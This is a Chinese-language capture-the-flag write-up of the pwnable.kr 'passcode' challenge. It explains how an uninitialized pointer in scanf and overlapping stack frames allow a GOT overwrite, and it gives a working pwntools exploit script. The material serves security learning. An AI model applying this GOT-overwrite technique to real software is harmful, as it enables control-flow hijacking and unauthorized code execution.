# passcode
## 1.分析逻辑
```c
void login(){
	int passcode1;
	int passcode2;

	printf("enter passcode1 : ");
	scanf("%d", passcode1);
	fflush(stdin);

	// ha! mommy told me that 32bit is vulnerable to bruteforcing :)
	printf("enter passcode2 : ");
        scanf("%d", passcode2);

	printf("checking...\n");
	if(passcode1==338150 && passcode2==13371337){
                printf("Login OK!\n");
                system("/bin/cat flag");
        }
        else{
                printf("Login Failed!\n");
		exit(0);
        }
}

void welcome(){
	char name[100];
	printf("enter you name : ");
	scanf("%100s", name);
	printf("Welcome %s!\n", name);
}

int main(){
	printf("Toddler's Secure Login System 1.0 beta.\n");

	welcome();
	login();

	// something after login...
	printf("Now I can safely trust you that you have credential :)\n");
	return 0;	
}
```
当`passcode1==338150 && passcode2==13371337`时输出flag，注意到scanf中的参数缺少了'&'因此不能直接输入。
# 2.漏洞
注意到welcome和login栈帧在同样的位置，可以通过构造写入到name中的数据来控制这两个变量。
用IDA观察栈的布局
login中两个变量位置为
```
int v1; // [esp+18h] [ebp-10h]
int v2; // [esp+1Ch] [ebp-Ch]
```
welcom中缓冲区位置为
```
char v1; // [esp+18h] [ebp-70h]
int v2; // [esp+1Ch] [ebp-Ch]
```
v2为canary，所以我们只能覆盖passcode1,不能覆盖passcode2，无法直接覆盖为对应数解决。
# 3.分析
本题可写GOT表，在`scanf("%d", passcode1);`后为printf函数，因此将passcode1覆盖为printfGOT表地址，然后跳到`system("/bin/cat flag");`即可。
printfGOT表地址为0804a000
```
.got.plt:08049FF4 _got_plt        segment dword public 'DATA' use32
.got.plt:08049FF4                 assume cs:_got_plt
.got.plt:08049FF4                 ;org 8049FF4h
.got.plt:08049FF4 _GLOBAL_OFFSET_TABLE_ dd offset _DYNAMIC
.got.plt:08049FF8 dword_8049FF8   dd 0                    ; DATA XREF: sub_8048410↑r
.got.plt:08049FFC dword_8049FFC   dd 0                    ; DATA XREF: sub_8048410+6↑r
.got.plt:0804A000 off_804A000     dd offset printf        ; DATA XREF: _printf↑r
.got.plt:0804A004 off_804A004     dd offset fflush        ; DATA XREF: _fflush↑r
```
跳转到080485e3
```
.text:080485E3                 mov     dword ptr [esp], offset command ; "/bin/cat flag"
.text:080485EA                 call    _system
```
# 4.利用
```python
from pwn import *
from zio3 import *
ssh = ssh(host='pwnable.kr',port =2222, user='passcode',password='guest')
sh = ssh.process(executable='./passcode')
printf_got=0x0804a000
payload1 = b'a'*(0x70-0x10)+l32(printf_got)
sys_addr=0x080485e3
payload2=str(sys_addr)
sh.recvuntil("enter you name :")
#sh.recvline()
sh.sendline(payload1)
sh.recvuntil("enter passcode1 :")
#sh.recvline()
sh.sendline(payload2)
print(sh.recvall())
```